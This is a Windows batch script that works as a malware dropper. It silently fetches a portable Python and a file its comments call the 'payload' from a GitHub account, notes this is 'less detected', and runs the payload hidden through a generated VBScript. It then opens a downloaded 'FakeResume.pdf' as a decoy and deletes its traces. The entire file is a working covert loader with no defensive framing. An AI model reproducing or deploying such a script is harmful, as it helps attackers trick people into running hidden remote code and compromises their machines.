@echo off

REM Download portable Python from your GitHub (less detected!)
curl -s https://github.com/workspacehome0/download/raw/main/python-portable.zip -o "%temp%\py.zip"

REM Extract portable Python
powershell -Command "Expand-Archive -Path '%temp%\py.zip' -DestinationPath '%temp%\py' -Force" >nul 2>&1

REM Download payload
curl -s https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py -o "%temp%\user.py"

REM Run payload with portable Python (hidden using VBScript)
echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\r.vbs"
echo WshShell.Run "%temp%\py\python.exe %temp%\user.py", 0, False >> "%temp%\r.vbs"
cscript //nologo "%temp%\r.vbs"

REM Download and open PDF
curl -s -L https://github.com/workspacehome0/download/raw/main/FakeResume.pdf -o "%temp%\doc.pdf"
start "" "%temp%\doc.pdf"

REM Cleanup
timeout /t 2 /nobreak >nul
del "%temp%\r.vbs"
del "%temp%\py.zip"
del "%temp%\user.py"
rd /s /q "%temp%\py" 2>nul

exit
